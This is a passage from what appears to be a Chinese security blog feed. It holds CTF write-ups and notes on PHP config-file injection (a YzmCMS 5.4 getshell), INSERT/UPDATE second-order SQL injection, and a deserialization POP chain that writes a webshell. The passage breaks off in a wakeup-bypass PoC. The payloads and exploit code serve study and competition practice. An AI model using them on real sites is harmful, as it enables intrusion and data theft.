<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的非贪婪且无-s修饰"><a href="#define情况下的非贪婪且无-s修饰" class="headerlink" title="define情况下的非贪婪且无/s修饰"></a>define情况下的非贪婪且无/s修饰</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>Payload如下：</p>
<p>第一种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h3 id="几个例子"><a href="#几个例子" class="headerlink" title="几个例子"></a>几个例子</h3><h4 id="YzmCMS-5-4后台getshell"><a href="#YzmCMS-5-4后台getshell" class="headerlink" title="YzmCMS 5.4后台getshell"></a>YzmCMS 5.4后台getshell</h4><p>漏洞函数如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_config</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">    $configfile = YZMPHP_PATH.<span class="string">'common'</span>.DIRECTORY_SEPARATOR.<span class="string">'config/config.php'</span>;</span><br><span class="line">    <span class="keyword">if</span>(!is_writable($configfile)) showmsg(<span class="string">'Please chmod '</span>.$configfile.<span class="string">' to 0777 !'</span>, <span class="string">'stop'</span>);</span><br><span class="line">    $pattern = $replacement = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($config <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">        $pattern[$k] = <span class="string">"/'"</span>.$k.<span class="string">"'\s*=&gt;\s*([']?)[^']*([']?)(\s*),/is"</span>;</span><br><span class="line">        $replacement[$k] = <span class="string">"'"</span>.$k.<span class="string">"' =&gt; \$&#123;1&#125;"</span>.$v.<span class="string">"\$&#123;2&#125;\$&#123;3&#125;,"</span>;                    </span><br><span class="line">    &#125;</span><br><span class="line">    $str = file_get_contents($configfile);</span><br><span class="line">    $str = preg_replace($pattern, $replacement, $str);</span><br><span class="line">    <span class="keyword">return</span> file_put_contents($configfile, $str, LOCK_EX);       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到$replacement变量是由字符拼接而来，并且${1}匹配的是单引号，那么我们就可以用$1来闭合前面的单引号，${1}等价于$1的，接着跟进调用了set_config的函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        yzm_base::load_common(<span class="string">'function/function.php'</span>, <span class="string">'admin'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'mail_inbox'</span>]) &amp;&amp; $_POST[<span class="string">'mail_inbox'</span>])&#123;</span><br><span class="line">                <span class="keyword">if</span>(!is_email($_POST[<span class="string">'mail_inbox'</span>])) showmsg(L(<span class="string">'mail_format_error'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'upload_types'</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'upload_types'</span>])) showmsg(<span class="string">'允许上传附件类型不能为空！'</span>, <span class="string">'stop'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $arr = <span class="keyword">array</span>();</span><br><span class="line">            $config = D(<span class="string">'config'</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">                <span class="keyword">if</span>(in_array($key, <span class="keyword">array</span>(<span class="string">'site_theme'</span>,<span class="string">'watermark_enable'</span>,<span class="string">'watermark_name'</span>,<span class="string">'watermark_position'</span>))) &#123;</span><br><span class="line">                    $value = safe_replace(trim($value));</span><br><span class="line">                    $arr[$key] = $value;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>($key!=<span class="string">'site_code'</span>)&#123;</span><br><span class="line">                        $value = htmlspecialchars($value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $config-&gt;update(<span class="keyword">array</span>(<span class="string">'value'</span>=&gt;$value), <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$key));</span><br><span class="line">            &#125;</span><br><span class="line">            set_config($arr);</span><br><span class="line">            delcache(<span class="string">'configs'</span>);</span><br><span class="line">            showmsg(L(<span class="string">'operation_success'</span>), <span class="string">''</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看出是从POST取值并且检查key是否在规定的数组中，如果在的话，进行一次内容过滤，然后赋给$arr数组，并且由于array数组中键可以对应着函数</p>
<p>比如 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x3D;&gt;&#39;x&#39;,foo()</span><br></pre></td></tr></table></figure>

<p>所以直接赋值为我们之前单引号闭合的payload就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$1,payload,$1</span><br></pre></td></tr></table></figure>

<h4 id="一个常见的绕过"><a href="#一个常见的绕过" class="headerlink" title="一个常见的绕过"></a>一个常见的绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^want$/'</span>, $_GET[<span class="string">'exp'</span>]) &amp;&amp; $_GET[<span class="string">'exp'</span>] !== <span class="string">'want'</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"test"</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对于这个过滤条件 我们可以用exp=want%0a进行绕过</p>
<p>原理为$可以对换行符进行匹配</p>
<p>同样的漏洞还有Apache换行解析漏洞，也就是shell.php\n可以以php的形式解析，也是利用了$可以匹配换行符导致的。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>深入探索insert注入与update注入</title>
    <url>/2019/07/16/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2insert%E6%B3%A8%E5%85%A5%E4%B8%8Eupdate%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近总是遇到一些<code>insert,update</code>类型二次注入，下面就来简单的总结一下，内容也不是很多，<code>insert与update</code>类似，下面只以<code>insert</code>为例。</p>
<h3 id="闭合单引号类型"><a href="#闭合单引号类型" class="headerlink" title="闭合单引号类型"></a>闭合单引号类型</h3><h4 id="单纯的本位闭合"><a href="#单纯的本位闭合" class="headerlink" title="单纯的本位闭合"></a>单纯的本位闭合</h4><p>什么是本位闭合呢，这应该算是我自己取的名字吧。如下是一个简单的insert语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">insert into ctf_test(`user`,`pwd`) values(<span class="string">'1'</span>,<span class="string">'2'</span>);</span><br></pre></td></tr></table></figure>

<p>当我们可以控制数字<code>1</code>的时候，我们有两种选择，第一种是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">' or if(1=1,sleep(3),1) or '</span></span><br></pre></td></tr></table></figure>

<p>第二种是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">',user())#</span></span><br></pre></td></tr></table></figure>

<p>这种方法可以注释掉原来不可以控制的第二位数据，使得第二位由我们来控制。那么我们称<strong>第一种为”本位闭合”，第二种为”非本位闭合”</strong>。</p>
<p>单纯的本位闭合一般都有什么较好的测试姿势呢？<br><strong>其实一般单纯的本位闭合的原因是因为逗号的过滤，不然其实非本位闭合，可以获得更多的数据，有更高的效率。</strong></p>
<p>盲注检测姿势(网鼎杯unfinish)</p>
<p>在闭合单引号型二次注入，检测payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">' or (case when 1=1 then sleep(3) else '</span><span class="number">2</span><span class="string">' end)='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>成功延时3s发现注入成功。</p>
<p>或许利用我们之前学到的姿势</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">'+(select hex(hex(database())))+'</span><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>将得到的数字进行两遍hex解码，为了不精度丢失，尽量利用<code>substr</code>提取字符串分段双hex。</p>
<h4 id="非本位闭合"><a href="#非本位闭合" class="headerlink" title="非本位闭合"></a>非本位闭合</h4><p>非本位闭合之前有介绍过，还是拿上面的这段payload。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">insert into ctf_test(`user`,`pwd`) values(<span class="string">'1'</span>,<span class="string">'2'</span>);</span><br></pre></td></tr></table></figure>

<p>如果页面的回显是只对<code>pwd</code>进行显示，而不对<code>user</code>字段进行显示该怎么操作，这时候非本位就有很大的作用了。</p>
<p>如：在1的数据位置上写入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,(select database()))#</span><br></pre></td></tr></table></figure>

<p>这样就可以在他能显示的位置上拿到我们想要的数据了。</p>
<p><strong>(PS:这里反引号其实也是可以闭合的)</strong></p>
<h4 id="特殊情况-多行insert注入"><a href="#特殊情况-多行insert注入" class="headerlink" title="特殊情况(多行insert注入)"></a>特殊情况(多行insert注入)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br></pre></td></tr></table></figure>

<p>如果这个数据的回显位在<code>content</code>处，而我们能二次注入的点在<code>category</code>处，我们还能通过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">',content=user()#</span></span><br></pre></td></tr></table></figure>

<p>这种操作达到二次注入的目的吗，<strong>答案是不能的</strong>，因为<code>#</code>是单行注释，而这里的注入语句是分行的，所以正常的非本位注入无法达到类似的目的，所以这里进行的是多行注释操作。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">category=<span class="string">' ,content=user(),/*content=*/#</span></span><br></pre></td></tr></table></figure>

<p><a href="https://s2.ax1x.com/2019/07/13/Z4CXbn.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/13/Z4CXbn.png" alt="Z4CXbn.png"></a></p>
<h3 id="非闭合单引号"><a href="#非闭合单引号" class="headerlink" title="非闭合单引号"></a>非闭合单引号</h3><p>其实这种情况和数字型注入差不多，只不过这里绕过的操作很多。</p>
<p>当对我的输入进行<code>is_numeric</code>进行判断时，我们可以用十六进制绕过，最终<code>select</code>查询时仍然会造成二次注入。</p>
<p>当过滤掉了<code>0x</code>时，我们可以用<code>char</code>函数，<code>char</code>出我们想要的字符进行绕过。</p>
<h3 id="insert多条记录插入注入"><a href="#insert多条记录插入注入" class="headerlink" title="insert多条记录插入注入"></a>insert多条记录插入注入</h3><p>这是一个很有趣的注入，首先来看一下所用的基本原理。</p>
<p><img src="https://s2.ax1x.com/2019/07/16/Z74eJA.png" alt="Z74eJA.png"></p>
<p>从图中可以看到我们可以利用<code>insert</code>来插入多条数据，那么这种利用的条件发生在哪呢？</p>
<p>例如我们有这样四个字段<code>id,password,content,user</code>，<strong><code>content</code>字段为可控字段，而且必须user符合我们现在的登陆账户才能插入进入数据</strong>，如果我们还是用传统的操作注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">',user())#</span></span><br></pre></td></tr></table></figure>

<p>这样肯定是不会生效的，因为我们的user()不符合，那怎么样才能达到注入的目的呢，这时就要用到我们的<code>多记录插入</code>了,payload如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">',user()),('</span><span class="number">1</span><span class="string">','</span><span class="number">2</span><span class="string">',user(),'</span>lihuaiqiu<span class="string">')</span></span><br></pre></td></tr></table></figure>

<p>最终成功得到注入结果，其实也可以用盲注，写个脚本，一样可以跑出来。</p>
<p><img src="https://s2.ax1x.com/2019/07/16/Z752NQ.png" alt="Z752NQ.png"></p>
<h3 id="二次注入tips"><a href="#二次注入tips" class="headerlink" title="二次注入tips"></a>二次注入tips</h3><ul>
<li>在有报错信息的情况下，可以通过注入<code>1\</code>来快速判断需要闭合的是哪种符号。</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>由一道题引发对CTF思维的思考</title>
    <url>/2019/06/01/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E5%BC%95%E5%8F%91%E5%AF%B9CTF%E6%80%9D%E7%BB%B4%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>利用一些时间做了强网杯,首先入手的就是<strong>upload</strong>这道题了，引发了自己的一些思考，下面来谈一下，并且总结一下自己做这道题的一些思路</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>题目复现链接:<br><a href="http://web17.buuoj.cn/" target="_blank" rel="noopener">http://web17.buuoj.cn/</a></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3k9mehfx2j31540mw7bu.jpg" alt="img"></p>
<p><strong>功能:注册，登陆，上传文件</strong></p>
<p><strong>思路一:</strong> 上传php文件进行<strong>getshell</strong>，其实这道题我是有扫过源码泄露的，但是可能因为工具不够强，并没有扫出<code>www.tar.gz</code>，所以我的第一思路还是直接去通过上传文件去<strong>getshell</strong>。</p>
<p>在上传文件的过程中推断后台的逻辑大概应该是用了<code>getimagesize</code>这样的函数对文件头进行检查，虽然自己的php文件绕过文件头检测成功上传到了，但是去<strong>upload目录下一看，变成了md5值加png后缀</strong>，<strong>其实在这个点困扰了一段时间，在纠结到底有没有可以突破附加png后缀的点</strong>，后来这部分的思路就放弃了，因为实在是不行</p>
<p><strong>不过通过思路一大概也可以推测出后台的逻辑代码:对上传后的文件，进行赋予一个随机md5值，并且添加上png后缀。</strong></p>
<p><strong>思路二</strong>:一开始看到题目发现大大的<strong>discuz与thinkphp</strong>，就有一些想法通过目前爆出来的漏洞去getshell，<strong>正巧我们有已经上传上去的恶意图片马，所以我们现在只需要找到一个thinkphp/discuz任意文件包含漏洞，即可getshell</strong>。</p>
<p>然后就是开启了疯狂google之旅，发现了一个这样的漏洞，<br><a href="http://www.moonsec.com/post-833.html" target="_blank" rel="noopener">http://www.moonsec.com/post-833.html</a> 尝试了一波，发现无果。</p>
<p><strong>思路三</strong>：其实每个思路的间隔时间差挺大，因为周末有物理实验和实验报告，并没有太多的时间去连续思索，在上面的<strong>思路二</strong>中，其实当时已经陷入了僵局，做完实验回来一看..70多个队伍做出来了，有点慌，后来队友和我说这里的<strong>user处的base64编码是存在反序列化的</strong>，我去看了一下，确实是这样(自己的信息搜集真实不到位Orz),解出来了如下一套数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:7:&quot;huaiqiu&quot;;s:5:&quot;email&quot;;s:16:&quot;lihuaiqiu@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;698d51a19d8a121ce581499d7b701668&quot;;s:3:&quot;img&quot;;s:79:&quot;..&#x2F;upload&#x2F;bc9c0f21801e3928b868149bfb65e408&#x2F;cd3d1cc6e477b590d1b89a6ee805808e.png&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>看到反序列化数据首先尝试了一下任意文件读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:4;s:8:&quot;username&quot;;s:7:&quot;huaiqiu&quot;;s:5:&quot;email&quot;;s:7:&quot;huaiqiu@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;698d51a19d8a121ce581499d7b701668&quot;;s:3:&quot;img&quot;;s:19:&quot;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>发现不太行,这里其实对源码泄露又产生了一些疑惑，<strong>不能任意文件读取，还有有类的源码泄露，怎么构造反序列化….</strong>，抱着怀疑的态度又去试了一下源码泄露扫描，还是无果..，不禁思考..<strong>难道真的是硬刚反序列化吗</strong>…..</p>
<p>然后思考着三个矛盾点:</p>
<p>1.<strong>如果是真的反序列化，那么硬刚反序列化的目的肯定是要在img部分去解析我们上传的图片马，并且一定是要以php方式进行解析，但是上传的文件都被修改为了png格式，这里就很矛盾。</strong></p>
<p>2.<strong>如果是某种我不知道的姿势去成功上传php文件getshell，那么这道题的user处的反序列化数据就没有用到，很明显，直接上传php文件getshell是个错误的思路。</strong></p>
<p>3.<strong>我在之前的思路二中有提及到一个问题，就是用框架的任意文件包含漏洞，去getshell，很明显..这同样不涉及反序列化数据，所以这个思路肯定是pass掉的</strong></p>
<p>所以当时思路几乎是莫得了，后来在临近比赛结束一个小时左右发现真的是有源码泄露..Orz，最后也没有做出来..(可以说是十分自闭了</p>
<h3 id="题目复盘"><a href="#题目复盘" class="headerlink" title="题目复盘"></a>题目复盘</h3><p>赛后进行了一波复现，复现过程如下:</p>
<p>主要后台逻辑文件共有<code>Register.php,login.php,Profile.php.Index.php</code>这四个文件</p>
<p>先理清一下文件的代码逻辑</p>
<p>register的函数逻辑</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbaxb9o7j31350hwtaz.jpg" alt="img"></p>
<p>首先调用__construct进行new Index(),从Index中调用login_check进行登陆检测，login_check函数代码如下：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbdsms7hj30u40ajdge.jpg" alt="img"></p>
<p>可以看到函数逻辑为将目前<strong>User处的反序列化数据与数据库中的进行对比，如果不同则直接返回0</strong>，这里就是我们要利用的一个点——–<strong>unserialize</strong></p>
<p>接着去找一下所有文件中危险魔术方法操作</p>
<p><strong>register处的__construct</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbkopahoj30rm0fbt9p.jpg" alt="img"></p>
<p><strong>register处destruct</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbgnza1jj30gt075mx5.jpg" alt="img"></p>
<p><strong>Profile中的<strong>call与</strong>get方法</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbin6dtvj30ju0cyweq.jpg" alt="img"></p>
<p><strong>这四个魔术方法足以形成一个pop链，去调用任意函数方法</strong>，解析如下:</p>
<p><strong>当<strong>destruct中的$this-&gt;checker指向的index方法如果在$this-&gt;checker这个类不存在的话，那么就会触发</strong>call方法，在<strong>call方法中逻辑:调用$this-&gt;{$name}，但是如果此类中仍然不存在$this-&gt;${name}变量的话,那么就会再一次触发</strong>get魔术方法，去返回expect数组中对应调用此$this-&gt;name的值，然后__call再次去调用expect数组中对应的值，所以只要我们构造好expect数组中index对应值，就可以实现执行任意方法的操作，将值写成方法的名字，便可调用任意方法。</strong></p>
<p>这里还要说明一点:为什么这个反序列化数据看起来的作用域是所有类的，看到所有类中是基本都有一个<strong>login_check</strong>函数的，所以反序列化的数据对应的作用域即是所有类，所以可以进行构造反序列化自由调用。</p>
<h4 id="既然可以执行任意方法函数了，下面来找一下危险函数方法"><a href="#既然可以执行任意方法函数了，下面来找一下危险函数方法" class="headerlink" title="既然可以执行任意方法函数了，下面来找一下危险函数方法"></a>既然可以执行任意方法函数了，下面来找一下危险函数方法</h4><p>在Profile类中存在<strong>upload-img危险函数</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbwpsd9kj30wx0ke765.jpg" alt="img"></p>
<p>可以看到有一个<strong>危险操作copy函数，如果我们控制了filename与filename_tmp就可以成功生成自己的webshell了</strong></p>
<p>这里在upload_img函数中有几个点需要去绕过一下：</p>
<ul>
<li>login_check函数：在反序列化时通过this-&gt;checker实例化Index类进行login_check调用检查，这里比较好绕过，<strong>可以不用管$this-&gt;checker(因为反序列化不会去调用__construct方法，还可以将$this&gt;checker赋值为0或者false,都可以实现绕过。</strong></li>
<li>第二个if，反序列化的时候不上传文件即可绕过。</li>
<li>第三个，就是之前所说的文件头伪造绕过的</li>
<li>赋值<strong>$this-&gt;ext为1</strong>,进入copy函数生成图片马</li>
</ul>
<p>下面为逻辑图</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kd2tuaeyj30t60dsdh6.jpg" alt="img"></p>
<p>这样我们就可以很轻松的写出反序列化构造代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Register</span><br><span class="line">&#123;</span><br><span class="line">    public $registed&#x3D;0;</span><br><span class="line">    public $checker;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker&#x3D;new Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $except&#x3D;array(&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;);</span><br><span class="line">    public $filename_tmp&#x3D;&#39;..&#x2F;public&#x2F;upload&#x2F;bc9c0f21801e3928b868149bfb65e408&#x2F;cd3d1cc6e477b590d1b89a6ee805808e.png&#39;;</span><br><span class="line">    public $filename&#x3D;&#39;..&#x2F;public&#x2F;upload&#x2F;lihuaiqiu.php&#39;;</span><br><span class="line">    public $ext&#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">$v&#x3D;new Register();</span><br><span class="line">echo base64_encode(serialize($v));</span><br></pre></td></tr></table></figure>

<p>将生成的base64编码放进cookie中，得到webshell</p>
<p><a href="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kdbu25hrj31590fnabf.jpg" target="_blank" rel="noopener">https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kdbu25hrj31590fnabf.jpg</a></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>通过这道题我们可以清楚，一道web的题的思路是多样化的，可能每一个点都有着对应着知识点与解题思路，同时也要注意做题前的信息搜集，比如注意源码泄露，以及cookie中或者返回的respone中所带有的信息，或者robots.txt等敏感文件，进而对各种点尝试不同的分析尝试思考，最终解题。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第十二届信息安全竞赛部分wp</title>
    <url>/2019/06/01/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h2 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h2><p>通过php伪协议可以读取到hint.php源码和index.php源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hint.php</span><br><span class="line">&lt;?php</span><br><span class="line"> class Handle&#123;</span><br><span class="line"> private $handle;</span><br><span class="line"> public function __wakeup()&#123;</span><br><span class="line"> foreach(get_object_vars($this) as $k &#x3D;&gt; $v) &#123;</span><br><span class="line"> $this-&gt;$k &#x3D; null;</span><br><span class="line"> &#125;</span><br><span class="line"> echo &quot;Waking up\n&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> public function __construct($handle) &#123;</span><br><span class="line"> $this-&gt;handle &#x3D; $handle;</span><br><span class="line"> &#125;</span><br><span class="line"> public function __destruct()&#123;</span><br><span class="line"> $this-&gt;handle-&gt;getFlag();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line"> public $file;</span><br><span class="line"> public $token;</span><br><span class="line"> public $token_flag;</span><br><span class="line"></span><br><span class="line">function __construct($file)&#123;</span><br><span class="line"> $this-&gt;file &#x3D; $file;</span><br><span class="line"> $this-&gt;token_flag &#x3D; $this-&gt;token &#x3D; md5(rand(1,10000));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">public function getFlag()&#123;</span><br><span class="line"> $this-&gt;token_flag &#x3D; md5(rand(1,10000));</span><br><span class="line"> if($this-&gt;token &#x3D;&#x3D;&#x3D; $this-&gt;token_flag)</span><br><span class="line"> &#123;</span><br><span class="line"> if(isset($this-&gt;file))&#123;</span><br><span class="line"> echo @highlight_file($this-&gt;file,true);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br><span class="line">index.php</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line"> error_reporting(0);</span><br><span class="line"> $file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line"> $payload &#x3D; $_GET[&quot;payload&quot;];</span><br><span class="line"> if(!isset($file))&#123;</span><br><span class="line"> echo &#39;Missing parameter&#39;.&#39;&lt;br&gt;&#39;;</span><br><span class="line"> &#125;</span><br><span class="line"> if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line"> die(&#39;hack attacked!!!&#39;);</span><br><span class="line"> &#125;</span><br><span class="line"> @include($file);</span><br><span class="line"> if(isset($payload))&#123;</span><br><span class="line"> $url &#x3D; parse_url($_SERVER[&#39;REQUEST_URI&#39;]);</span><br><span class="line"> parse_str($url[&#39;query&#39;],$query);</span><br><span class="line"> foreach($query as $value)&#123;</span><br><span class="line"> if (preg_match(&quot;&#x2F;flag&#x2F;&quot;,$value)) &#123;</span><br><span class="line"> die(&#39;stop hacking!&#39;);</span><br><span class="line"> exit();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $payload &#x3D; unserialize($payload);</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> echo &quot;Missing parameters&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;!--Please test index.php?file&#x3D;xxx.php --&gt;</span><br><span class="line"> &lt;!--Please get the source of hint.php--&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>第一个绕过点</strong>:通过<code>parse_url</code>函数返回<code>false</code>绕过<code>flag</code>字段的过滤，详解我的这篇博客<a href="http://a1han.top/index.php/2019/04/03/parse_url函数小记/" target="_blank" rel="noopener">http://a1han.top/index.php/2019/04/03/parse_url%e5%87%bd%e6%95%b0%e5%b0%8f%e8%ae%b0/</a></p>
<p><strong>第二个绕过点</strong>:绕过Flag的过滤进入反序列化，这里我们发现有<code>wakeup</code>魔术方法,联想到<code>**CVE-2016-7124**</code>，具体绕过例子：<code>O:6:&quot;sercet&quot;:**1**:</code>，对于一个这样的反序列化，我们需要把<code>1</code>改为<code>2</code>，构造一个虚假的对象数量，使<code>wakeup</code>不能正常被调用。</p>
<p><strong>第三个绕过点</strong>:<code>$this-&gt;token = $this-&gt;token_flag</code>,需要这两个值相等，才能正常读取<code>flag</code>，我们可以利用<code>$this-&gt;token = &amp;$this-&gt;token_flag</code>，构造这两个值始终相等</p>
<p>通过这三点构造<code>Poc</code></p>
<p>第一个<code>Poc</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class Handle&#123;</span><br><span class="line"> private $handle;</span><br><span class="line"> public function __wakeup()&#123;</span><br><span class="line"> foreach(get_object_vars($this) as $k &#x3D;&gt; $v) &#123;</span><br><span class="line"> $this-&gt;$k &#x3D; null;</span><br><span class="line"> &#125;</span><br><span class="line"> echo &quot;Waking up\n&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> public function __construct($handle) &#123;</span><br><span class="line"> $this-&gt;handle &#x3D; $handle;</span><br><span class="line"> &#125;</span><br><span class="line"> public function __destruct()&#123;</span><br><span class="line"> $this-&gt;handle-&gt;getFlag();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line"> public $file;</span><br><span class="line"> public $token;</span><br><span class="line"> public $token_flag;</span><br><span class="line"></span><br><span class="line">function 